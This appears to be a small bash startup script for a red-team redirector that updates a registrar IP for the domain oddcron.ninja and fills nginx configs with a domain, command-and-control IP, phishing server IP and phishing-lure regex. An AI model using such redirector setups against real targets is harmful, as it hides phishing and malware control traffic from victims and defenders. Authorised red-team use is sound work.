#!/bin/bash


if [[ $REGISTRAR == "name" ]]; then
    python3 scripts/redirector_ip/update_ip_address.py -d oddcron.ninja -u andross561;
    python3 scripts/redirector_ip/check_ip.py -d oddcron.ninja;
fi

sed -i /etc/nginx/conf.d/*.conf -e "s/__DOMAIN__/$DOMAIN/g"
sed -i /etc/nginx/conf.d/*.conf -e "s/__C2IP__/$C2IP/g"
sed -i /etc/nginx/conf.d/*.conf -e "s/__PHISHIP__/$PHISHIP/g"
sed -i /etc/nginx/conf.d/*.conf -e "s/__PHISHING_LURES_REGEX__/$PHISHING_LURES_REGEX/g"

/scripts/entrypoint.sh